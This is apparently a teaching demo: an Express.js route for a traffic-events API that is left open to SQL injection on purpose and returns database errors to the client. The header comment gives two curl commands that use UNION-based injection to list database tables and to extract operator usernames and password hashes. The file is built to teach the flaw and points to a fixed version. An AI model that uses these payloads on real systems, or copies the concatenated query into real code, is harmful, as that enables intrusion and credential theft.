/**
 * VULNERABLE TO SQL INJECTION — educational demo only (branch: insegura)
 * Shows UNION-based SQLi to extract DB schema and operadores table.
 * Fix: see historico.js (prepared statements).
 *
 * Demo attack:
 *   # Extract tables
 *   curl "http://host/api/historico?zona=norte'%20UNION%20SELECT%20table_name,null,null,null,null,null%20FROM%20information_schema.tables--&fecha=2024-01-01&tipo=camara"
 *
 *   # Extract operator credentials
 *   curl "http://host/api/historico?zona=norte'%20UNION%20SELECT%20username,password_hash,null,null,null,null%20FROM%20operadores--&fecha=2024-01-01&tipo=camara"
 */

const express = require("express")
const db = require("../db/postgres")

const router = express.Router()

router.get("/", async (req, res) => {
  const { zona, fecha, tipo } = req.query
  // VULNERABILITY: user input directly concatenated into SQL string
  const query = `SELECT * FROM eventos_trafico
                 WHERE zona = '${zona}'
                 AND DATE(timestamp) = '${fecha}'
                 AND tipo_sensor = '${tipo}'`
  try {
    const result = await db.query(query)
    res.json(result.rows)
  } catch (err) {
    // Error details exposed intentionally for demo
    res.status(500).json({ error: err.message, detail: err.detail })
  }
})

module.exports = router
